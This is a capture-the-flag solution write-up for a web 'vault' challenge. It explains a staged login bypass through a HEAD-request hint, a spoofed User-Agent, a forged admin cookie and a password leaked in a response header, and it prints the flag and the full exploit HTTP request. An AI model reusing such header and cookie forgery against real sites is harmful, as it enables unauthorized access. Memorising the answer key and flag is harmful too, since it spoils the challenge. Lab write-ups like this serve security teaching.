# WebSecDojo Vault Challenge - Solution

## Flag
```
flag#B4nk5Ar3c00l!
```

## Vulnerability
The challenge uses a multi-stage authentication bypass based on HTTP method and header inspection:

1. **HEAD method reveals authentication hint**: The hint "Don't get aHEAD of yourself" indicates using the HEAD HTTP method. A HEAD request reveals a custom header `banker-agent-access: You need to be Agent33`, which is not visible in normal GET requests.

2. **User-Agent based authentication**: Setting `User-Agent: Agent33` changes the page to show "Identified banker Agent33. Please provide secret cookie."

3. **Cookie-based authentication**: The page loads `static/js/cookie.js` which reveals the cookie validation logic:
   - Cookie name: `admins`
   - Expected value: `btoa(CryptoJS.MD5("true").toString())`
   - Computed value: `YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=`

4. **Password from response header**: After setting the correct cookie, the server returns a `bank-access-code: 1573!` header which is the password.

## Exploitation Request

The final request that retrieved the flag:

```http
POST /vault/ HTTP/1.1
host: websecdojo.com
accept-encoding: gzip, br, deflate
accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
accept-language: en-US,en;q=0.9
user-agent: Agent33
cookie: admins=YjMyNmI1MDYyYjJmMGU2OTA0NjgxMDcxNzUzNGNiMDk=
content-type: application/x-www-form-urlencoded

password=1573%21
```

## h5i Message IDs
- `req_0` / `res_0`: Initial GET request to /vault/
- `req_3` / `res_3`: HEAD request revealing `banker-agent-access` header
- `req_7` / `res_7`: HEAD request with User-Agent: Agent33 (no banker-agent-access header in response)
- `req_8` / `res_8`: GET request with User-Agent: Agent33 showing "Please provide secret cookie"
- `req_9` / `res_9`: GET request for static/js/cookie.js revealing cookie validation logic
- `req_10` / `res_10`: GET with correct cookie, revealing `bank-access-code: 1573!` header
- `req_11` / `res_11`: Final POST with password, returning the flag
